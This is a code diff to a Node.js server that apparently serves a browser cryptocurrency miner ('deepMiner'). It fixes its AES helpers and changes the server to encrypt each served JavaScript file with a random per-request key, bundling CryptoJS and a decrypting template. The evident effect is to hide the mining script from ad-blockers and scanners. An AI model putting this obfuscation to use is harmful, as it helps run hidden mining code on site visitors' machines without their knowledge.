@@ -38,7 +38,7 @@ function enAES(key, str) {
         mode: CryptoJS.mode.ECB,
         padding: CryptoJS.pad.Pkcs7
     });
-    return encrypt;
+    return encrypt.toString();
 }
 
 function deAES(key, str) {
@@ -46,7 +46,7 @@ function deAES(key, str) {
         mode: CryptoJS.mode.ECB,
         padding: CryptoJS.pad.Pkcs7
     });
-    return decrypt;
+    return decrypt.toString(CryptoJS.enc.Utf8);
 }
 
 const stats = (req, res) => {
@@ -57,15 +57,17 @@ const stats = (req, res) => {
             res.writeHead(301, {
                 'Location': 'https://' + conf.domain
             });
-            res.end(buf);
+            res.end();
         } else {
             if (!req.url.match(/\.wasm$/) && !req.url.match(/\.mem$/)) {
                 buf = buf.toString().replace(/%deepMiner_domain%/g, conf.domain);
                 if (req.url.match(/\.js$/)) {
                     var randKey = rand(32);
-                    buf = buf.replace(/%AES_FILE%/g, buf);
-                    buf = buf.replace(/%AES_KEY%/g, randKey);
-                    buf = buf.replace(/%CryptoJS_CODE%/g, fs.readFileSync('./crypto-js-3.1.9.min.js', 'utf8'));
+                    tmp = fs.readFileSync('./tmpl.aes.min.js', 'utf8');
+                    tmp = tmp.replace(/%aes_file%/g, enAES(randKey, buf));
+                    tmp = tmp.replace(/%aes_key%/g, randKey);
+                    buf = fs.readFileSync('./crypto-js-3.1.9.min.js', 'utf8');
+                    buf += tmp;
                     res.setHeader('content-type', 'application/javascript');
                 }
             } else {
